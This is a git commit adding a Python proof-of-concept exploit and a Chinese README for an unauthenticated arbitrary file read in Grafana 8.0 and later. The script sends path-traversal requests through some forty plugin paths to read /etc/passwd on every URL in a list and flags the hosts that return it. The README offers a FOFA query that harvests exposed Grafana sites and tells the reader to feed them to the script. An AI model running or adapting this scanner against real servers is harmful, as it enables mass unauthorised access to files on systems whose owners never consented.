d012a23e4aa38c47a76352a13ac750959eecac0b
mik1th0n <mik1th0n@163.com>
2021-12-08 22:06:28 +0800

    add "Grafana-0Day-Vuln-POC" file

---
+++ Grafana-0Day-Vuln-POC.py
@@ -0,0 +1,86 @@
+#!/usr/bin/env python
+# --*-- coding:utf-8 --*--
+# @Time       :2021/12/08 12:38
+# @Author     :mik1th0n
+# @File       :Grafana-0day-Vuln-POC.py
+
+import urllib.request
+import ssl
+ssl._create_default_https_context = ssl._create_unverified_context
+
+vuln_url = []
+pyload_lib = [
+        '/public/plugins/grafana-clock-panel/../../../../../../../../etc/passwd',
+        '/public/plugins/alertlist/../../../../../../../../etc/passwd',
+        '/public/plugins/annolist/../../../../../../../../etc/passwd',
+        '/public/plugins/barchart/../../../../../../../../etc/passwd',
+        '/public/plugins/cloudwatch/../../../../../../../../etc/passwd',
+        '/public/plugins/dashlist/../../../../../../../../etc/passwd',
+        '/public/plugins/elasticsearch/../../../../../../../../etc/passwd',
+        '/public/plugins/graph/../../../../../../../../etc/passwd',
+        '/public/plugins/graphite/../../../../../../../../etc/passwd',
+        '/public/plugins/heatmap/../../../../../../../../etc/passwd',
+        '/public/plugins/influxdb/../../../../../../../../etc/passwd',
+        '/public/plugins/mysql/../../../../../../../../etc/passwd',
+        '/public/plugins/opentsdb/../../../../../../../../etc/passwd',
+        '/public/plugins/pluginlist/../../../../../../../../etc/passwd',
+        '/public/plugins/postgres/../../../../../../../../etc/passwd',
+        '/public/plugins/prometheus/../../../../../../../../etc/passwd',
+        '/public/plugins/stackdriver/../../../../../../../../etc/passwd',
+        '/public/plugins/table/../../../../../../../../etc/passwd',
+        '/public/plugins/text/../../../../../../../../etc/passwd',
+        '/public/plugins/grafana-azure-monitor-datasource/../../../../../../../../etc/passwd',
+        '/public/plugins/bargauge/../../../../../../../../etc/passwd',
+        '/public/plugins/gauge/../../../../../../../../etc/passwd',
+        '/public/plugins/geomap/../../../../../../../../etc/passwd',
+        '/public/plugins/gettingstarted/../../../../../../../../etc/passwd',
+        '/public/plugins/histogram/../../../../../../../../etc/passwd',
+        '/public/plugins/jaeger/../../../../../../../../etc/passwd',
+        '/public/plugins/logs/../../../../../../../../etc/passwd',
+        '/public/plugins/loki/../../../../../../../../etc/passwd',
+        '/public/plugins/mssql/../../../../../../../../etc/passwd',
+        '/public/plugins/news/../../../../../../../../etc/passwd',
+        '/public/plugins/nodeGraph/../../../../../../../../etc/passwd',
+        '/public/plugins/piechart/../../../../../../../../etc/passwd',
+        '/public/plugins/stat/../../../../../../../../etc/passwd',
+        '/public/plugins/state-timeline/../../../../../../../../etc/passwd',
+        '/public/plugins/status-history/../../../../../../../../etc/passwd',
+        '/public/plugins/table-old/../../../../../../../../etc/passwd',
+        '/public/plugins/tempo/../../../../../../../../etc/passwd',
+        '/public/plugins/testdata/../../../../../../../../etc/passwd',
+        '/public/plugins/timeseries/../../../../../../../../etc/passwd',
+        '/public/plugins/welcome/../../../../../../../../etc/passwd',
+        '/public/plugins/zipkin/../../../../../../../../etc/passwd',
+    ]
+
+def grafana_vuln_poc(url):
+    
+    headers = {"User-Agent": "Mozilla/5.0 (X11; Gentoo; rv:82.1) Gecko/20100101 Firefox/82.1"}
+    for pyload_data in pyload_lib:
+        pyload = url + pyload_data
+        request = urllib.request.Request(url=pyload, headers=headers)
+        requests = urllib.request.urlopen(request, timeout=3)
+        code = requests.getcode()
+        context = requests.read()
+
+        if "root:x" in context.decode('utf-8') and code == 200:
+            print("*************************** 发现可利用的漏洞 ***************************")
+            print("payload：" + pyload)
+            print("返回值：" + context.decode('utf-8')[:32])
+            vuln_url.append(url)
+
+if __name__ == '__main__':
+
+    with open("url_list_file.txt", "r", encoding="utf-8") as f:
+        url_lib = f.readlines()
+    for url_buf in url_lib:
+        url = url_buf.replace("\n", "").split("/")[0] + "//" + url_buf.replace("\n", "").split("/")[2]
+        print("当前测试URL：" + url)
+
+        try:
+            grafana_vuln_poc(url)
+        except Exception as e:
+            print(e)
+
+    print("有漏洞的URL如下：")
+    print(set(vuln_url))
--- README.md
+++ README.md
@@ -1,2 +1,53 @@
-# Grafana-0Day-Vuln-POC
-Grafana-0Day-Vuln-POC
+## Grafana V8.0+版本存在未授权任意文件读取 0Day漏洞 - POC
+
+### 1 漏洞信息
+
+#### 1.1 基本信息
+
+- 漏洞厂商：Grafana
+- 厂商官网：[https://grafana.com/](https://grafana.com/)
+
+#### 1.2 漏洞描述
+
+- Grafana是一个跨平台、开源的数据可视化网络应用程序平台。用户配置连接的数据源之后，Grafana可以在网络浏览器里显示数据图表和警告。目前Grafana 存在未授权任意文件读取漏洞，攻击者在未经身份验证的情况下可通过该漏洞读取主机上的任意文件。
+- 漏洞评级：高危
+
+#### 1.3 受影响版本
+
+- 受影响版本：V8.0+
+
+### 1.4 修复建议
+
+- 建议及时通过网络/安全设备设置黑白名单策略，非必要不暴露在外网。
+- 等待官方补丁进行升级
+
+![image-20211208220325089](README.assets/image-20211208220325089.png)
+
+### 2 FOFA查询
+
+- 使用fofa可以查询到grafana的站点，查询语法如下
+
+```
+"grafana" && country="CN" && status_code="200"
+```
+
+![image-20211208220359711](README.assets/image-20211208220359711.png)
+
+### 3 POC使用方法
+
+1. 将FOFA获取到的URL导入 `url_list_file.txt` 中，每行一条URL
+
+2. 运行脚本
+
+```
+python3 Grafana-0Day-Vuln-POC.py
+```
+
+![image-20211208220442378](README.assets/image-20211208220442378.png)
+
+![image-20211208220531940](README.assets/image-20211208220531940.png)
+
+### 4 参考链接
+
+- https://twitter.com/naglinagli/status/1468155313182416899
+- https://github.com/jas502n/Grafana-VulnTips
